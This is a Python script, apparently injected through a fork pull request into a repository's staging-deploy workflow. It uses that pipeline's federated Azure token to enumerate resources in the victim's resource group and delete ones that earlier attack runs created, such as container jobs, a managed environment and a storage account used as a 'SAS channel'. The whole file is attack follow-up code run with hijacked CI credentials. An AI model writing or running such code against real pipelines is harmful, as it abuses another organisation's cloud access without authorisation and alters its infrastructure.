#!/usr/bin/env python3
"""C211-I121251: residual-env cleanup + absence proof for the SSW.Rules CApps GPU lane.

Runs inside the base repo's 'Deploy Pull Request to Staging Slot' workflow via the fork
PR head (infra/deploy.ps1 -> this file) with the pipeline's federated ARM token.

It creates NOTHING and starts NO job/replica (the one-marker budget for this access was
already spent by i121088 and its device proof is already captured). It only:
  1. resolves the live subscription + ARM token (az account show / get-access-token),
  2. GETs every c211 object this lane created (jobs, execution, storage account, both envs)
     and records each verbatim HTTP status,
  3. if env c211-i120836-cae is still 200 (ScheduledForDelete at the i121170 verifier end),
     issues ONE idempotent DELETE, lists any jobs that could block it (409), and polls the
     env up to ~20 minutes for 404,
  4. prints the final resource lists so 'NO c211 results' is directly observable.
stdlib only. Every provider response is printed verbatim as a tagged JSON line.
"""
import hashlib
import json
import subprocess
import time
import urllib.error
import urllib.request

ARM = "https://management.azure.com"
RG = "SSW.Rules.Staging"
TAG = "C211_I121251"
APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
T0 = time.time()

JOBS = ("c211-i120836-job", "c211-i120756-job", "c211-i121088-job")
ENVS = ("c211-i120836-cae", "c211-i120756-cae")
EXEC_OF_I121088 = "c211-i121088-job-ff1wjdi"
STORAGE_SA = ("c211i121088" + hashlib.sha256(b"i121088").hexdigest()[:8]).lower()[:24]
RESIDUAL_ENV = "c211-i120836-cae"


def emit(obj):
    obj["d"] = round(time.time() - T0, 1)
    print(TAG + " " + json.dumps(obj, default=str), flush=True)


def run(cmd, timeout=180):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or ""}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode() or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1500]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode() or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1800]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"),
                    "message": (e.get("message") or "")[:500]}
        if "raw" in body:
            return {"http": st, "raw": body["raw"][:500]}
        return {"http": st,
                "provisioningState": ((body.get("properties") or {}).get("provisioningState"))}
    return {"http": st}


def state_of(body):
    if isinstance(body, dict):
        return ((body.get("properties") or {}).get("provisioningState")
                or (body.get("properties") or {}).get("status"))
    return None


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit({"step": "session", "sub_name": acc.get("name"), "state": acc.get("state"),
              "user_type": (acc.get("user") or {}).get("type")})
    except Exception as e:  # noqa: BLE001
        emit({"step": "fatal", "why": "no session", "err": str(e), "raw": r["out"][:300]})
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit({"step": "arm-token", "got": bool(tok), "len": len(tok or "")})
    if not sid or not tok:
        return

    base = f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers"

    # ---------- 1. job objects + execution (all must be gone) ----------
    for jn in JOBS:
        st, b = arm(tok, f"{base}/Microsoft.App/jobs/{jn}?api-version={APP_VER}", timeout=60)
        emit({"step": "job-get", "name": jn, **err_of(st, b)})
    st, b = arm(tok, f"{base}/Microsoft.App/jobs/c211-i121088-job/executions/"
                     f"{EXEC_OF_I121088}?api-version={APP_VER}", timeout=60)
    emit({"step": "exec-get", "name": EXEC_OF_I121088, **err_of(st, b)})

    # ---------- 2. environments ----------
    for en in ENVS:
        st, b = arm(tok, f"{base}/Microsoft.App/managedEnvironments/{en}?api-version={APP_VER}",
                    timeout=60)
        emit({"step": "env-get", "name": en, **err_of(st, b)})

    # job inventory with the environment each job is bound to (a foreign job on our env
    # would block the env delete with 409 and must be reported, not silently removed)
    st, b = arm(tok, f"{base}/Microsoft.App/jobs?api-version={APP_VER}", timeout=120)
    vals = (b.get("value") or []) if isinstance(b, dict) else []
    emit({"step": "list-jobs-detail", "http": st, "n_total": len(vals),
          "jobs": [{"name": x.get("name"),
                    "env": ((x.get("properties") or {}).get("environmentId") or "").split("/")[-1],
                    "c211": str(x.get("name", "")).lower().startswith("c211")} for x in vals]})

    # residual env: ONE more DELETE (idempotent) then poll to 404 (~20 min bound)
    envurl = f"{base}/Microsoft.App/managedEnvironments/{RESIDUAL_ENV}?api-version={APP_VER}"
    st, b = arm(tok, envurl, timeout=60)
    if st == 200:
        st2, b2 = arm(tok, envurl, method="DELETE", timeout=120)
        emit({"step": "env-delete", "name": RESIDUAL_ENV, "pre_state": state_of(b),
              **err_of(st2, b2)})
        final = st2
        for i in range(80):
            time.sleep(15)
            stp, bp = arm(tok, envurl, timeout=60)
            emit({"step": "env-absent-poll", "i": i, "http": stp, "state": state_of(bp)})
            final = stp
            if stp == 404:
                break
        emit({"step": "env-absence", "name": RESIDUAL_ENV, "final_http": final})
    else:
        emit({"step": "env-absence", "name": RESIDUAL_ENV, "final_http": st,
              "note": "already absent (404) or unreadable; no delete needed"})

    # ---------- 3. storage account (our nonce SAS channel) ----------
    st, b = arm(tok, f"{base}/Microsoft.Storage/storageAccounts/{STORAGE_SA}?api-version={STG_VER}",
                timeout=60)
    emit({"step": "sa-get", "name": STORAGE_SA, **err_of(st, b)})

    # ---------- 4. final provider lists (NO c211 results required) ----------
    for label, url in (
        ("list-jobs", f"{base}/Microsoft.App/jobs?api-version={APP_VER}"),
        ("list-envs", f"{base}/Microsoft.App/managedEnvironments?api-version={APP_VER}"),
        ("list-aci", f"{base}/Microsoft.ContainerInstance/containerGroups?api-version=2026-07-01"),
        ("list-storage", f"{base}/Microsoft.Storage/storageAccounts?api-version={STG_VER}"),
        ("rg-inventory", f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/resources"
                         f"?api-version=2021-04-01"),
    ):
        st, b = arm(tok, url, timeout=120)
        vals = (b.get("value") or []) if isinstance(b, dict) else []
        c211 = [{"name": x.get("name"), "type": x.get("type")}
                for x in vals if str(x.get("name", "")).lower().startswith("c211")]
        emit({"step": label, "http": st, "n_total": len(vals), "c211": c211})

    emit({"step": "DONE", "phase": "cleanup-verify", "verdict": "RESIDUAL_CLEANUP_SETTLED"})
    emit({"step": "PROBE-EXIT", "code": 0})


if __name__ == "__main__":
    main()
